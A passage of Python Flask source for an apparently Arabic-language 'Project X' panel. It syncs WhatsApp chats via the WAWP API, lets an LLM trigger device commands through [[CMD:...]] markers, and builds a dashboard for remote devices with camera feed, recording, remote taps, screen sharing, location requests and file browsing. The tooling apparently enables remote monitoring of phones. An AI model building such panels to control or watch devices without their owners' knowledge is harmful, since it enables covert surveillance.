        send_wawp_text(chat_id, message)
        logger.info(f"✅ تم إرسال إشعار صلاحية واتساب: {safe_permission}/{safe_status}")
    except Exception as notify_error:
        logger.warning(f"تعذر إرسال إشعار الصلاحية إلى واتساب: {notify_error}")


def mark_pending_location_request(device_id):
    safe_device_id = normalize_device_id(device_id)
    if not safe_device_id:
        return
    with pending_location_lock:
        pending_location_requests[safe_device_id] = datetime.now(timezone.utc)


def pop_pending_location_request(device_id):
    safe_device_id = normalize_device_id(device_id)
    if not safe_device_id:
        return False
    with pending_location_lock:
        ts = pending_location_requests.pop(safe_device_id, None)

        # تنظيف الطلبات القديمة
        if len(pending_location_requests) > 2000:
            cutoff = datetime.now(timezone.utc) - timedelta(hours=24)
            for known_id, created_at in list(pending_location_requests.items()):
                if created_at < cutoff:
                    pending_location_requests.pop(known_id, None)

    return ts is not None


def get_chat_display_name(chat_id, payload=None):
    payload = payload or {}
    candidate = str(
        payload.get('pushName')
        or payload.get('name')
        or payload.get('notifyName')
        or ''
    ).strip()
    if candidate:
        return candidate
    digits = extract_phone_digits_from_chat_id(chat_id)
    return f"+{digits}" if digits else chat_id


def get_chat_profile_pic(chat_id, payload=None):
    payload = payload or {}
    candidates = [
        payload.get('profilePicUrl'),
        payload.get('profilePic'),
        payload.get('avatar'),
        (payload.get('contact') or {}).get('profilePic') if isinstance(payload.get('contact'), dict) else '',
    ]
    for item in candidates:
        value = str(item or '').strip()
        if value:
            return value

    seed = extract_phone_digits_from_chat_id(chat_id) or chat_id
    return f"https://api.dicebear.com/9.x/initials/svg?seed={seed}"


def append_whatsapp_message(
    chat_id,
    direction,
    text='',
    message_type='text',
    media_url='',
    file_name='',
    external_id='',
    payload=None,
):
    canonical_chat = canonicalize_chat_id(chat_id)
    if not canonical_chat:
        return None

    now = datetime.now(timezone.utc)
    display_name = get_chat_display_name(canonical_chat, payload)
    profile_pic = get_chat_profile_pic(canonical_chat, payload)
    safe_text = str(text or '').strip()
    safe_message_type = str(message_type or 'text').strip().lower() or 'text'
    safe_media_url = str(media_url or '').strip()
    safe_file_name = str(file_name or '').strip()
    safe_external_id = str(external_id or '').strip()

    msg_payload = {
        'id': str(uuid.uuid4()),
        'external_id': safe_external_id,
        'chat_id': canonical_chat,
        'direction': direction,
        'text': safe_text,
        'message_type': safe_message_type,
        'media_url': safe_media_url,
        'file_name': safe_file_name,
        'timestamp': now.isoformat(),
    }

    with whatsapp_state_lock:
        conversation = whatsapp_conversations.get(canonical_chat)
        if not conversation:
            conversation = {
                'chat_id': canonical_chat,
                'phone_digits': extract_phone_digits_from_chat_id(canonical_chat),
                'display_name': display_name,
                'profile_pic': profile_pic,
                'last_message': '',
                'last_at': now.isoformat(),
                'unread': 0,
                'messages': [],
            }
            whatsapp_conversations[canonical_chat] = conversation

        if display_name:
            conversation['display_name'] = display_name
        if profile_pic:
            conversation['profile_pic'] = profile_pic

        if safe_external_id:
            for existing in conversation['messages']:
                if str(existing.get('external_id', '')).strip() == safe_external_id:
                    return existing

        conversation['messages'].append(msg_payload)
        if len(conversation['messages']) > MAX_WHATSAPP_MESSAGES_PER_CHAT:
            conversation['messages'] = conversation['messages'][-MAX_WHATSAPP_MESSAGES_PER_CHAT:]

        preview_text = safe_text or safe_file_name or ('ملف' if safe_message_type != 'text' else 'رسالة')
        conversation['last_message'] = preview_text
        conversation['last_at'] = now.isoformat()

        if direction == 'in':
            conversation['unread'] = int(conversation.get('unread', 0)) + 1

    socketio.emit('whatsapp_event', {
        'type': 'message',
        'chat_id': canonical_chat,
        'message': msg_payload,
    }, room='main_room')

    return msg_payload


def get_whatsapp_chats_overview():
    with whatsapp_state_lock:
        items = []
        for convo in whatsapp_conversations.values():
            items.append({
                'chat_id': convo.get('chat_id', ''),
                'phone_digits': convo.get('phone_digits', ''),
                'display_name': convo.get('display_name', ''),
                'profile_pic': convo.get('profile_pic', ''),
                'last_message': convo.get('last_message', ''),
                'last_at': convo.get('last_at', ''),
                'unread': int(convo.get('unread', 0)),
            })

    items.sort(key=lambda x: x.get('last_at', ''), reverse=True)
    return items


def send_wawp_media(chat_id, local_file_path, caption=''):
    instance_id = app.config.get('WAWP_INSTANCE_ID', '').strip()
    access_token = app.config.get('WAWP_ACCESS_TOKEN', '').strip()
    base_url = app.config.get('WAWP_BASE_URL', 'https://api.wawp.net').strip().rstrip('/')

    if not instance_id or not access_token:
        raise ValueError('إعدادات WAWP غير مكتملة: WAWP_INSTANCE_ID / WAWP_ACCESS_TOKEN')

    if not os.path.exists(local_file_path):
        raise FileNotFoundError('الملف غير موجود للإرسال')

    params = {
        'instance_id': instance_id,
        'access_token': access_token,
    }

    endpoint_candidates = [
        f"{base_url}/v2/send/media",
        f"{base_url}/v2/send/file",
        f"{base_url}/v2/send/document",
    ]

    last_error = ''
    with open(local_file_path, 'rb') as file_handle:
        file_name = os.path.basename(local_file_path)
        for endpoint in endpoint_candidates:
            file_handle.seek(0)
            response = requests.post(
                endpoint,
                params=params,
                data={'chatId': chat_id, 'caption': caption},
                files={'file': (file_name, file_handle, 'application/octet-stream')},
                timeout=45,
            )
            if response.ok:
                try:
                    return {'success': True, 'provider_response': response.json(), 'endpoint': endpoint}
                except ValueError:
                    return {'success': True, 'provider_response': response.text, 'endpoint': endpoint}
            last_error = f"{response.status_code} {response.text[:240]}"

    raise RuntimeError(f"فشل إرسال الملف عبر WAWP: {last_error}")


def send_wawp_text(chat_id, message, reply_to=None):
    instance_id = app.config.get('WAWP_INSTANCE_ID', '').strip()
    access_token = app.config.get('WAWP_ACCESS_TOKEN', '').strip()
    base_url = app.config.get('WAWP_BASE_URL', 'https://api.wawp.net').strip().rstrip('/')
    fallback_raw = str(app.config.get('WAWP_FALLBACK_BASE_URLS', '') or '').strip()

    candidate_base_urls = [base_url]
    if fallback_raw:
        for item in fallback_raw.split(','):
            parsed = str(item or '').strip().rstrip('/')
            if parsed and parsed not in candidate_base_urls:
                candidate_base_urls.append(parsed)

    if not instance_id or not access_token:
        raise ValueError('إعدادات WAWP غير مكتملة: WAWP_INSTANCE_ID / WAWP_ACCESS_TOKEN')

    payload = {
        'chatId': chat_id,
        'message': message,
    }
    if reply_to:
        payload['reply_to'] = reply_to

    params = {
        'instance_id': instance_id,
        'access_token': access_token,
    }

    try:
        connect_timeout = float(app.config.get('WAWP_CONNECT_TIMEOUT', 8))
    except Exception:
        connect_timeout = 8.0
    try:
        read_timeout = float(app.config.get('WAWP_READ_TIMEOUT', 35))
    except Exception:
        read_timeout = 35.0
    try:
        retries = int(app.config.get('WAWP_SEND_RETRIES', 2))
    except Exception:
        retries = 2
    try:
        backoff_seconds = float(app.config.get('WAWP_RETRY_BACKOFF_SECONDS', 1.4))
    except Exception:
        backoff_seconds = 1.4

    retries = max(0, min(retries, 5))
    connect_timeout = max(3.0, min(connect_timeout, 30.0))
    read_timeout = max(8.0, min(read_timeout, 90.0))
    backoff_seconds = max(0.2, min(backoff_seconds, 8.0))

    last_error = 'unknown error'
    total_attempts = retries + 1

    for attempt_idx in range(total_attempts):
        for provider_idx, provider_base_url in enumerate(candidate_base_urls, start=1):
            endpoint = f"{provider_base_url}/v2/send/text"
            try:
                response = requests.post(
                    endpoint,
                    params=params,
                    json=payload,
                    timeout=(connect_timeout, read_timeout),
                )
            except requests.Timeout as timeout_error:
                last_error = f'timeout at {provider_base_url}: {timeout_error}'
                logger.warning(
                    f"WAWP timeout (attempt {attempt_idx + 1}/{total_attempts}, provider {provider_idx}/{len(candidate_base_urls)}): {provider_base_url}"
                )
                continue
            except requests.RequestException as request_error:
                last_error = f'network error at {provider_base_url}: {request_error}'
                logger.warning(
                    f"WAWP network error (attempt {attempt_idx + 1}/{total_attempts}, provider {provider_idx}/{len(candidate_base_urls)}): {provider_base_url}"
                )
                continue

            if response.ok:
                try:
                    return response.json()
                except ValueError:
                    return {'ok': True, 'raw': response.text}

            error_text = response.text[:600]
            last_error = f'HTTP {response.status_code} from {provider_base_url}: {error_text}'

            # أخطاء العميل غالبًا لن تتحسن مع إعادة المحاولة.
            if 400 <= response.status_code < 500 and response.status_code not in {408, 429}:
                raise RuntimeError(f'فشل إرسال واتساب ({response.status_code}): {error_text}')

        if attempt_idx < retries:
            time.sleep(backoff_seconds * (attempt_idx + 1))

    raise RuntimeError(f'فشل إرسال واتساب بعد {total_attempts} محاولة: {last_error}')


def wawp_request_json(endpoint_path, params=None):
    base_url = app.config.get('WAWP_BASE_URL', 'https://api.wawp.net').strip().rstrip('/')
    instance_id = app.config.get('WAWP_INSTANCE_ID', '').strip()
    access_token = app.config.get('WAWP_ACCESS_TOKEN', '').strip()
    if not instance_id or not access_token:
        return None

    merged = {
        'instance_id': instance_id,
        'access_token': access_token,
    }
    if params:
        merged.update(params)

    try:
        response = requests.get(f"{base_url}{endpoint_path}", params=merged, timeout=25)
    except Exception:
        return None

    if not response.ok:
        return None

    try:
        return response.json()
    except Exception:
        return None


def normalize_provider_message_type(raw_type, has_media=False, file_name=''):
    t = str(raw_type or '').strip().lower()
    name = str(file_name or '').lower()
    if 'image' in t:
        return 'image'
    if 'video' in t:
        return 'video'
    if 'audio' in t or 'ptt' in t or 'voice' in t:
        return 'audio'
    if 'pdf' in t or name.endswith('.pdf'):
        return 'pdf'
    if 'document' in t or has_media:
        return 'file'
    return 'text'


def parse_provider_list(data):
    if isinstance(data, list):
        return data
    if not isinstance(data, dict):
        return []
    for key in ('data', 'result', 'results', 'items', 'messages', 'chats', 'payload'):
        value = data.get(key)
        if isinstance(value, list):
            return value
    return []


def sync_whatsapp_from_provider(force=False):
    global whatsapp_last_provider_sync

    now = datetime.now(timezone.utc)
    if not force and (now - whatsapp_last_provider_sync).total_seconds() < 8:
        return {'success': True, 'synced': False, 'reason': 'throttled'}

    if not whatsapp_sync_lock.acquire(blocking=False):
        return {'success': True, 'synced': False, 'reason': 'busy'}

    try:
        chats_data = None
        for endpoint in (
            '/v2/chats',
            '/v2/chat/list',
            '/v2/whatsapp/chats',
        ):
            chats_data = wawp_request_json(endpoint, params={'limit': 50})
            if chats_data:
                break

        chats = parse_provider_list(chats_data)
        if not chats:
            whatsapp_last_provider_sync = now
            return {'success': True, 'synced': False, 'reason': 'no_provider_chats'}

        merged_messages = 0
        for chat in chats:
            raw_chat_id = str(
                chat.get('chatId')
                or chat.get('id')
                or chat.get('_serialized')
                or chat.get('from')
                or ''
            ).strip()
            chat_id = canonicalize_chat_id(raw_chat_id)
            if not chat_id:
                continue

            display_name = get_chat_display_name(chat_id, chat)
            profile_pic = get_chat_profile_pic(chat_id, chat)

            with whatsapp_state_lock:
                conversation = whatsapp_conversations.get(chat_id)
                if not conversation:
                    conversation = {
                        'chat_id': chat_id,
                        'phone_digits': extract_phone_digits_from_chat_id(chat_id),
                        'display_name': display_name,
                        'profile_pic': profile_pic,
                        'last_message': '',
                        'last_at': now.isoformat(),
                        'unread': 0,
                        'messages': [],
                    }
                    whatsapp_conversations[chat_id] = conversation
                if display_name:
                    conversation['display_name'] = display_name
                if profile_pic:
                    conversation['profile_pic'] = profile_pic

            msg_data = None
            for endpoint in (
                '/v2/messages',
                '/v2/chat/messages',
                '/v2/whatsapp/messages',
            ):
                msg_data = wawp_request_json(endpoint, params={'chatId': chat_id, 'limit': 60})
                if msg_data:
                    break

            messages = parse_provider_list(msg_data)
            for msg in messages:
                provider_id = str(msg.get('id') or msg.get('_id') or msg.get('messageId') or '').strip()
                body = str(msg.get('body') or msg.get('text') or msg.get('message') or '').strip()
                from_me = bool(msg.get('fromMe') or msg.get('from_me') or msg.get('isFromMe'))
                media_url = str(msg.get('mediaUrl') or msg.get('url') or msg.get('fileUrl') or '').strip()
                file_name = str(msg.get('fileName') or msg.get('filename') or msg.get('mediaName') or '').strip()
                msg_type = normalize_provider_message_type(msg.get('type') or msg.get('messageType'), bool(media_url), file_name)

                appended = append_whatsapp_message(
                    chat_id=chat_id,
                    direction='out' if from_me else 'in',
                    text=body,
                    message_type=msg_type,
                    media_url=media_url,
                    file_name=file_name,
                    external_id=provider_id,
                    payload=msg,
                )
                if appended:
                    merged_messages += 1

        whatsapp_last_provider_sync = now
        return {'success': True, 'synced': True, 'merged_messages': merged_messages, 'chats': len(chats)}
    finally:
        whatsapp_sync_lock.release()

def ask_hf_assistant(user_message, context_text='', system_instruction=''):
    api_key = app.config.get('HF_API_KEY', '').strip()
    if not api_key:
        raise AIServiceError('HF_API_KEY غير مضبوط', 500)

    model = app.config.get('HF_MODEL', 'deepseek-ai/DeepSeek-R1:fastest').strip() or 'deepseek-ai/DeepSeek-R1:fastest'
    base_url = app.config.get('HF_BASE_URL', 'https://router.huggingface.co/v1').strip().rstrip('/')

    # ترحيل تلقائي من endpoint القديم الذي أصبح غير مدعوم.
    if 'api-inference.huggingface.co' in base_url:
        base_url = 'https://router.huggingface.co/v1'

    if base_url == 'https://router.huggingface.co':
        base_url = 'https://router.huggingface.co/v1'

    if base_url.endswith('/chat/completions'):
        endpoint = base_url
    else:
        endpoint = f'{base_url}/chat/completions'

    base_prompt = (
        'You are an operations assistant for a device management dashboard. '
        'To execute a command, use [[CMD:command_name]]. '
    )
    system_prompt = f"{base_prompt}\n{system_instruction}"

    messages = [
        {'role': 'system', 'content': system_prompt},
    ]

    if context_text:
        messages.append({'role': 'system', 'content': f'Context: {context_text}'})

    messages.append({'role': 'user', 'content': user_message})

    payload = {
        'model': model,
        'messages': messages,
        'temperature': 0.2,
        'max_tokens': 500,
        'stream': False,
    }

    headers = {
        'Authorization': f'Bearer {api_key}',
        'Content-Type': 'application/json',
    }

    try:
        response = requests.post(
            endpoint,
            json=payload,
            headers=headers,
            timeout=60,
        )
    except requests.RequestException as e:
        raise AIServiceError(f'تعذر الاتصال بخدمة Hugging Face: {e}', 502)

    if response.status_code >= 400:
        detail = ''
        try:
            err_json = response.json()
            if isinstance(err_json, dict):
                raw_error = err_json.get('error') or err_json.get('message') or ''
                if isinstance(raw_error, dict):
                    detail = str(raw_error.get('message') or raw_error.get('type') or raw_error).strip()
                else:
                    detail = str(raw_error).strip()
            elif isinstance(err_json, list) and err_json:
                detail = str(err_json[0]).strip()
        except Exception:
            detail = (response.text or '').strip()

        if response.status_code == 410:
            raise AIServiceError(
                'Hugging Face endpoint غير مدعوم. استخدم HF_BASE_URL=https://router.huggingface.co/v1',
                410,
            )

        if response.status_code in (401, 403):
            raise AIServiceError(
                'مفتاح Hugging Face غير صالح أو لا يملك صلاحية. راجع HF_API_KEY '
                'وتأكد أن التوكن يحتوي صلاحية Inference Providers.',
                response.status_code,
            )

        if response.status_code == 429:
            raise AIServiceError('Hugging Face rate limit reached. حاول لاحقاً.', 429)

        if response.status_code == 400 and 'model' in detail.lower() and ('not found' in detail.lower() or 'unknown' in detail.lower()):
            raise AIServiceError(
                f'الموديل الحالي غير متاح ({model}). غيّر HF_MODEL إلى موديل Chat صالح مثل deepseek-ai/DeepSeek-R1:fastest.',
                400,
            )

        raise AIServiceError(
            f'Hugging Face API error ({response.status_code}): {detail or "Unknown error"}',
            response.status_code,
        )

    try:
        data = response.json()
    except Exception:
        raise AIServiceError('Hugging Face API returned invalid JSON', 502)

    content = ''
    if isinstance(data, dict):
        choices = data.get('choices') or []
        if choices:
            message = choices[0].get('message', {})
            raw_content = message.get('content')
            if isinstance(raw_content, list):
                parts = []
                for part in raw_content:
                    if isinstance(part, dict):
                        parts.append(str(part.get('text') or part.get('content') or ''))
                    else:
                        parts.append(str(part))
                content = ''.join(parts).strip()
            else:
                content = str(raw_content or '').strip()

        if data.get('error'):
            raise AIServiceError(f'Hugging Face API error: {data.get("error")}', 502)

        if not content:
            content = str(data.get('generated_text') or data.get('summary_text') or '').strip()
    elif isinstance(data, list) and data:
        first = data[0]
        if isinstance(first, dict):
            content = str(first.get('generated_text') or first.get('summary_text') or '').strip()

    if not content:
        raise AIServiceError('Hugging Face API returned an empty response', 502)

    return content

def ask_ai_assistant(user_message, context_text='', system_instruction=''):
    try:
        return ask_primary_ai_assistant(user_message, context_text, system_instruction)
    except (AIServiceError, ValueError) as primary_error:
        hf_key = app.config.get('HF_API_KEY', '').strip()
        if not hf_key:
            raise primary_error

        primary_message = primary_error.message if isinstance(primary_error, AIServiceError) else str(primary_error)
        primary_status = primary_error.status_code if isinstance(primary_error, AIServiceError) else 500

        logger.warning(f'Primary AI failed; trying Hugging Face fallback: {primary_message}')
        try:
            return ask_hf_assistant(user_message, context_text, system_instruction)
        except AIServiceError as fallback_error:
            raise AIServiceError(
                f'{primary_message} | Hugging Face fallback failed: {fallback_error.message}',
                primary_status,
            )

# ============ HTML Templates ============
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Project X</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #020402; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; position: relative; overflow: hidden; padding: 20px; box-sizing: border-box; }
        #matrixCanvas { position: fixed; inset: 0; width: 100%; height: 100%; z-index: 0; }
        body::before { content: ''; position: fixed; inset: 0; background: radial-gradient(circle at top, rgba(0, 120, 40, 0.24), rgba(0, 0, 0, 0.86)); z-index: 1; }
        .login-box { position: relative; z-index: 2; background: rgba(18, 18, 18, 0.84); border: 1px solid rgba(0,255,120,0.45); padding: 40px; border-radius: 10px; box-shadow: 0 0 35px rgba(0,255,120,0.35), 0 0 90px rgba(0,255,120,0.16), inset 0 0 25px rgba(0,255,120,0.08); backdrop-filter: blur(4px); width: 100%; max-width: 400px; text-align: center; }
        h1 { color: #33ff88; margin-bottom: 30px; text-shadow: 0 0 12px rgba(0,255,140,0.85); }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #333; border: 1px solid #444; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0f0; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        button:hover { background: #00cc00; }
        .error { color: #ff4444; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>
    <div class="login-box">
        <h1>المشروع X 🔐</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="اسم المستخدم" required>
            <input type="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit">دخول</button>
            <div id="errorMsg" class="error"></div>
        </form>
    </div>
    <script>
        const matrixCanvas = document.getElementById('matrixCanvas');
        const matrixCtx = matrixCanvas.getContext('2d');
        const matrixChars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&*+-';
        const matrixFontSize = 18;
        const matrixFrameGapMs = 20;
        let matrixDrops = [];
        let lastMatrixFrame = 0;

        function resizeMatrix() {
            matrixCanvas.width = window.innerWidth;
            matrixCanvas.height = window.innerHeight;
            const columns = Math.floor(matrixCanvas.width / matrixFontSize);
            matrixDrops = Array.from({ length: columns }, () => Math.floor(Math.random() * -100));
        }

        function drawMatrix(timestamp = 0) {
            if (timestamp - lastMatrixFrame < matrixFrameGapMs) {
                requestAnimationFrame(drawMatrix);
                return;
            }
            lastMatrixFrame = timestamp;

            matrixCtx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            matrixCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
            matrixCtx.font = '700 ' + matrixFontSize + 'px monospace';
            matrixCtx.shadowColor = 'rgba(0, 255, 170, 0.85)';
            matrixCtx.shadowBlur = 12;

            for (let i = 0; i < matrixDrops.length; i++) {
                const char = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
                const x = i * matrixFontSize;
                const y = matrixDrops[i] * matrixFontSize;

                matrixCtx.fillStyle = Math.random() > 0.9 ? '#e8fff1' : '#00ff75';

                matrixCtx.fillText(char, x, y);

                if (y > matrixCanvas.height && Math.random() > 0.992) {
                    matrixDrops[i] = Math.floor(Math.random() * -20);
                }
                if (Math.random() > 0.02) {
                    matrixDrops[i] += 1;
                }
            }

            requestAnimationFrame(drawMatrix);
        }

        resizeMatrix();
        drawMatrix();
        window.addEventListener('resize', resizeMatrix);

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            try {
                const res = await fetch('/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({username, password})
                });
                const data = await res.json();
                if (data.success) {
                    window.location.href = '/dashboard';
                } else {
                    const err = document.getElementById('errorMsg');
                    err.textContent = data.error;
                    err.style.display = 'block';
                }
            } catch (e) {
                alert('خطأ في الاتصال');
            }
        });
    </script>
</body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - Project X</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- محاولة تحميل المكتبة من CDN، وإذا فشل نستخدم النسخة المدمجة في السيرفر -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        if (typeof io === 'undefined') {
            document.write('<script src="/socket.io/socket.io.js"><\\/script>');
        }
    </script>
    <style>
        :root { --primary: #d4af37; --primary-soft: #f5df9c; --accent: #8f1111; --accent-dark: #4b0707; --bg: #050202; --bg-soft: #120505; --card: #170707; --card-soft: #241010; --line: #5f2214; --line-soft: rgba(212, 175, 55, 0.22); --text: #f7edd6; --muted: #c3a56d; }
        body { font-family: 'Segoe UI', sans-serif; background: radial-gradient(circle at top right, rgba(212, 175, 55, 0.14), transparent 24%), radial-gradient(circle at top left, rgba(143, 17, 17, 0.26), transparent 34%), linear-gradient(140deg, #050202 0%, #120505 45%, #040101 100%); color: var(--text); margin: 0; padding: 20px; overflow-x: hidden; }
        .app-layout { display: grid; grid-template-columns: 260px 1fr; gap: 16px; align-items: start; }
        .sidebar { background: linear-gradient(180deg, rgba(30, 9, 9, 0.96), rgba(18, 5, 5, 0.98)); border: 1px solid var(--line-soft); border-radius: 14px; padding: 14px; position: sticky; top: 12px; }
        .sidebar h3 { margin: 0 0 12px 0; color: var(--primary-soft); font-size: 1rem; border-bottom: 1px solid var(--line-soft); padding-bottom: 8px; }
        .side-link { width: 100%; text-align: right; margin-bottom: 8px; padding: 10px 12px; border-radius: 8px; border: 1px solid rgba(212, 175, 55, 0.2); background: linear-gradient(180deg, #261010, #180808); color: var(--text); cursor: pointer; transition: 0.25s; }
        .side-link:hover { border-color: rgba(212, 175, 55, 0.45); color: var(--primary-soft); }
        .side-link.active { background: linear-gradient(180deg, #f0c455, #aa7a17); color: #230808; border-color: rgba(255, 220, 130, 0.6); font-weight: 700; }
        .content-area { min-width: 0; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 1px solid var(--line-soft); padding-bottom: 20px; }
        .header h1 { color: var(--primary-soft); margin: 0; text-shadow: 0 0 18px rgba(212, 175, 55, 0.16); }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .card { background: linear-gradient(180deg, rgba(30, 9, 9, 0.96), rgba(18, 5, 5, 0.98)); padding: 20px; border-radius: 14px; border: 1px solid var(--line-soft); box-shadow: 0 18px 40px rgba(0,0,0,0.35), inset 0 1px 0 rgba(255,215,140,0.04); }
        .page-card { display: none; }
        .page-card.active { display: block; }
        .card h2 { margin-top: 0; border-bottom: 1px solid var(--line-soft); padding-bottom: 10px; font-size: 1.2rem; color: var(--primary-soft); letter-spacing: 0.3px; }
        .device-item { background: linear-gradient(180deg, #271111, #1a0a0a); padding: 15px; margin-bottom: 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; border-right: 3px solid var(--primary); border: 1px solid rgba(143, 17, 17, 0.35); cursor: pointer; transition: 0.3s; }
        .device-item:hover { background: linear-gradient(180deg, #341212, #210808); }
        .device-item.selected { border-color: var(--primary); background: linear-gradient(180deg, #3c1414, #230909); box-shadow: 0 0 0 1px rgba(212, 175, 55, 0.15); }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-left: 5px; }
        .online { background: var(--primary); box-shadow: 0 0 8px rgba(212, 175, 55, 0.65); }
        .offline { background: #612020; }
        .btn { background: linear-gradient(180deg, #261010, #180808); border: 1px solid rgba(212, 175, 55, 0.45); color: var(--primary-soft); padding: 8px 15px; border-radius: 7px; cursor: pointer; transition: 0.3s; }
        .btn:hover { background: linear-gradient(180deg, #f0c455, #aa7a17); color: #230808; box-shadow: 0 8px 18px rgba(212, 175, 55, 0.18); }
        .btn-danger { background: linear-gradient(180deg, #7a0f0f, #4c0808); border-color: #d86c4f; color: #ffd8cb; }
        .btn-danger:hover { background: linear-gradient(180deg, #b01b1b, #680d0d); color: #fff; }
        #feedWrapper { position: relative; }
        #cameraFeed { width: 100%; height: auto; min-height: 250px; background: #0a0505; border-radius: 5px; object-fit: contain; border: 1px solid var(--line-soft); box-shadow: inset 0 0 30px rgba(0,0,0,0.45); }
        #tapOverlay { position: absolute; inset: 0; border-radius: 5px; overflow: hidden; pointer-events: none; }
        .tap-marker { position: absolute; width: 18px; height: 18px; border-radius: 50%; border: 2px solid var(--primary); background: rgba(143, 17, 17, 0.25); box-shadow: 0 0 12px rgba(212, 175, 55, 0.9); transform: translate(-50%, -50%) scale(0.4); animation: tapPing 0.7s ease-out forwards; }
        .control-group { margin-bottom: 15px; border: 1px solid rgba(143, 17, 17, 0.45); padding: 10px; border-radius: 10px; background: linear-gradient(180deg, #1b0909, #120505); }
        .control-group h3 { margin-top: 0; font-size: 0.9rem; color: var(--muted); border-bottom: 1px solid var(--line-soft); padding-bottom: 5px; margin-bottom: 10px; }
        .btn-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 8px; }
        .log-box { height: 200px; overflow-y: auto; background: #090303; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 0.9rem; border: 1px solid rgba(212, 175, 55, 0.18); }
        .log-entry { margin-bottom: 5px; border-bottom: 1px solid rgba(212, 175, 55, 0.08); padding-bottom: 2px; }
        .ai-input { width: 100%; min-height: 90px; resize: vertical; background: #120606; border: 1px solid rgba(212, 175, 55, 0.2); color: var(--text); border-radius: 6px; padding: 10px; box-sizing: border-box; }
        .ai-output { height: 180px; overflow-y: auto; background: #090303; border: 1px solid rgba(212, 175, 55, 0.18); border-radius: 6px; padding: 10px; margin-top: 10px; font-size: 0.9rem; }
        .screen-panel { margin-top: 12px; padding: 10px; border: 1px solid rgba(212, 175, 55, 0.18); border-radius: 6px; background: linear-gradient(180deg, #120606, #0b0303); display: none; }
        .screen-panel-title { color: var(--primary-soft); margin-bottom: 8px; font-size: 0.9rem; }
        #screenShareFeed { width: 100%; height: auto; min-height: 190px; background: #0a0505; border-radius: 5px; object-fit: contain; border: 1px solid rgba(212, 175, 55, 0.18); }
        .qr-img { max-width: 150px; margin: 10px auto; display: block; border: 5px solid var(--primary); }
        .rec-indicator { position: absolute; top: 10px; right: 10px; background: #8f1111; color: var(--primary-soft); padding: 5px 10px; border-radius: 5px; font-weight: bold; display: none; animation: blink 1s infinite; border: 1px solid rgba(212, 175, 55, 0.45); box-shadow: 0 6px 18px rgba(143, 17, 17, 0.28); }
        /* تحسين عرض الملفات كشبكة */
        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; padding: 10px; }
        .file-card { background: #1b0909; border-radius: 8px; overflow: hidden; position: relative; aspect-ratio: 1; border: 1px solid rgba(212, 175, 55, 0.16); transition: 0.3s; }
        .file-card:hover { transform: scale(1.05); z-index: 10; border-color: var(--primary); }
        .file-card img, .file-card video { width: 100%; height: 100%; object-fit: cover; cursor: pointer; }
        .file-card .file-info { position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.8); color: #fff; font-size: 0.7rem; padding: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .file-card .file-actions { position: absolute; top: 5px; right: 5px; display: none; gap: 5px; }
        .file-card:hover .file-actions { display: flex; }
        .file-icon-placeholder { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 3rem; color: #8f6a2a; background: #150707; }
        .wa-layout { display: grid; grid-template-columns: 290px 1fr; gap: 12px; min-height: 540px; }
        .wa-sidebar-list { border: 1px solid rgba(212, 175, 55, 0.2); border-radius: 10px; background: #0f0404; padding: 10px; display: flex; flex-direction: column; }
        .wa-new-chat-row { display: grid; grid-template-columns: 1fr 52px; gap: 8px; margin-bottom: 10px; }
        .wa-phone-input { background: #1a0909; border: 1px solid rgba(212, 175, 55, 0.25); color: var(--text); border-radius: 8px; padding: 10px; }
        .wa-chats-list { overflow-y: auto; max-height: 480px; }
        .wa-chat-item { display: grid; grid-template-columns: 48px 1fr; gap: 9px; align-items: center; border: 1px solid rgba(212, 175, 55, 0.16); border-radius: 10px; padding: 8px; margin-bottom: 8px; cursor: pointer; background: #1a0808; }
        .wa-chat-item.active { border-color: rgba(212, 175, 55, 0.5); background: #2a0d0d; }
        .wa-chat-item:hover { background: #240b0b; }
        .wa-avatar { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; border: 1px solid rgba(212, 175, 55, 0.35); background: #120505; }
        .wa-chat-name { font-size: 0.92rem; color: var(--text); font-weight: 600; }
        .wa-chat-preview { font-size: 0.78rem; color: #bf9f6a; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .wa-chat-time { font-size: 0.72rem; color: #8f7442; }
